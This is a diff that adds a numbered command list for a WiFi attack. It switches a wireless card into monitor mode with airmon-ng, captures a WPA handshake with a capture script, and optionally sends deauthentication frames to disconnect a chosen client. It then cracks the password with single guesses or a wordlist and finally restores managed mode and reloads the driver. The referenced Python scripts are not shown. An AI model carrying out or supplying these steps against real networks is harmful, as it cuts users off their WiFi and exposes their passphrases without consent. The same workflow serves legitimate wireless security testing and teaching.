@@ -1,0 +1,46 @@
+1.
+iw dev
+iw dev wlan0 link
+
+2.
+switch to monitor mode:
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0 153  --> tunes on specific channnel
+
+3.
+iw dev
+sudo iw dev wlan0mon set channel 153 --> set the monitor mode channel t0 153
+
+4.
+capture (terminal 1) --> leave it running, it saves capture-01.cap on its own
+sudo python3 code/capture.py
+
+5.
+deauth (terminal 2, OPTIONAL) --> run WHILE capture.py is still running in terminal 1.
+forces a connected client to reconnect so the 4-way handshake happens immediately
+instead of waiting for a natural reconnect.
+first set CLIENT_MAC in code/config.py to the client you want to knock off, then:
+sudo python3 code/deauth.py
+
+6.
+crack (after capture.py exits and capture-01.cap exists)
+python3 code/crack.py info
+python3 code/crack.py single "your password"
+
+7.
+python3 code/crack.py wordlist
+
+8.
+switch to managed mode:
+sudo airmon-ng stop wlan0mon
+sudo systemctl restart NetworkManager
+
+9.
+sudo modprobe -r mt7921e
+sudo modprobe mt7921e
+
+
+10.
+if modprobe complains then-->
+sudo modprobe -r mt7921e mt7921_common mt792x_lib mt76_connac_lib mt76
+sudo modprobe mt7921e
